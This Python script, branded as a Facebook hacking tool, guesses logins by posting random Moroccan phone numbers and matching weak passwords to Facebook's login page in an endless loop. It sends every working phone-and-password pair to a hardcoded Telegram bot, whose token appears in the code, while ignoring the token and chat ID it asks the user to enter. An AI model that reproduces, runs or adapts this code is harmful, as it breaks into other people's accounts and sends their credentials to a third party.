
import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')
else:
    try:
        import time
    except:
        os.system('pip install time')
    else:
        os.system('clear')
        try:
            import pyfiglet
        except:
            os.system('pip install pyfiglet')
        else:
            os.system('clear')
            import pyfiglet, os
            from time import sleep
            import webbrowser         
            ss=0
            bb=0
            hh=0
            sr = 0
            bd = 0
            ht = 0
            import random, uuid, requests, string
            from user_agent import generate_user_agent
            from datetime import datetime
            from random import *
            from time import sleep
            import requests, os, random, json, threading, secrets, uuid
            from colorama import Fore, Style
            from time import sleep
            from datetime import datetime
            from secrets import token_hex
            from uuid import uuid4
            from user_agent import generate_user_agent
            from uuid import uuid4
        Z = '\x1b[1;31m'
        X = '\x1b[1;33m'
        Z1 = '\x1b[2;31m'
        F = '\x1b[2;32m'
        A = '\x1b[2;34m'
        C = '\x1b[2;35m'
        B = '\x1b[2;36m'
        K = '\x1b[1;34m'  
        C = "\033[1;97m" 

        
        fell= """                                                 

\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy FB [Fell Ing] \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @Felling666
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @Felling666
\033[1;31m--------------------------------
 """
        #_________________________________                                  
        r = requests.session()
        print(fell)
        TOOLS = input("""
\033[1;31m [ \033[2;32m 1 \033[1;31m ] \033[2;36m Hakc‌‌ Facebook 
\033[2;31m----------------------------------------------
\033[1;31m [ \033[2;32m + \033[1;31m ] \x1b[1;33m Please Choose : \x1b[2;32m""")
        if TOOLS == '1':   
        #_________________________________                                 
            os.system('clear')
            print(fell)
            tok = input(Z+"["+F+"⌯"+Z+"]"+X+ "TOKEN TLG"+Z+" :\n"+B)
            ID = input(Z+"["+F+"⌯"+Z+"]"+X+ "ID TLG"+Z+" :\n"+B)
            os.system('clear')
            print (f''' 
{F}            
  ______             _                 _    
 |  ____|           | |               | |   
 | |__ __ _  ___ ___| |__   ___   ___ | | __
 |  __/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
 | | | (_| | (_|  __/ |_) | (_) | (_) |   < 
 |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
                                            
                                            
\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy FB fell ing\033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @Felling666
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @Felling666
\033[1;31m--------------------------------

          \033[1;33m<\033[2;32m Morocco cracked \033[1;33m> 
             
\033[1;31m--------------------------------          
              ''')
            #_________________________________
            start_msg = requests.post(f"https://api.telegram.org/bot2052962464:AAH2h1VOs0r60O3J_RROyPZQZ1xHt4DYy2c/sendMessage?chat_id=1803859361&text=start : @Felling ").json()
            id_msg = start_msg['result']['message_id']           
            while True:
                user = '0123456789'
                us = str(''.join((random.choice(user) for i in range(7))))                
                felling = '+21266' + us
                fellings = '066' + us         
             
                link = 'https://d.facebook.com/login.php'
                data = {'email':felling,  'pass':fellings}
                headers = {'User-Agent':'Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.0; Trident/3.1)'}
                
                shot = requests.post(link,headers=headers,data=data).text
                if 'xc_message' in shot:
                    print(F + ' Email ==> : ' + felling + ': pass ==> : ' + fellings)
                    hh+=1
                    r.post(f'''https://api.telegram.org/bot2052962464:AAH2h1VOs0r60O3J_RROyPZQZ1xHt4DYy2c/sendMessage?chat_id=1803859361&text=⌯⌯ 𝙷𝙸 𝙽𝙴𝚆 Felling 𝙷𝚊𝙲𝚔 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺  ⌯
. — — — — —  — — — — — . 
⌯ ᴇᴍᴀɪʟ : {felling}
⌯ ᴘᴀѕѕ : {fellings}
. — — — — —  — — — — —
• TLG : @Felling666
  ''' )
                elif 'checkpointSubmitButton-actual-button' in shot:
                    print(X + ' Email ==> : ' + felling + ': pass ==> : ' + fellings)
                    ss+=1
                    
                    with open('hit-facbook.txt', 'a') as (fell):
                        fell.write('{}:{}\n'.format(felling, fellings))
                else:
                    print(Z + ' Email ==> : ' + felling + ': pass ==> : ' + fellings)
                    bb+=1
                    requests.post(f"https://api.telegram.org/bot2052962464:AAH2h1VOs0r60O3J_RROyPZQZ1xHt4DYy2c/editmessagetext?chat_id=1803859361&message_id="+str(id_msg)+"&text=\n- 𝙷𝙸 𝙽𝙴W Feeling 𝙷𝚊𝙲𝚔 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 \n.— — — — —  — — — — — . \n⌯  𝙷𝚊𝚌𝚔 : "+str(hh)+"\n⌯  𝙱𝙰𝙳 : "+str(bb)+"\n⌯  𝚂𝙴𝙲𝙾𝚁 : "+str(ss)+"\n. — — — — —  — — — — — .\n• TLG : @Felling666")
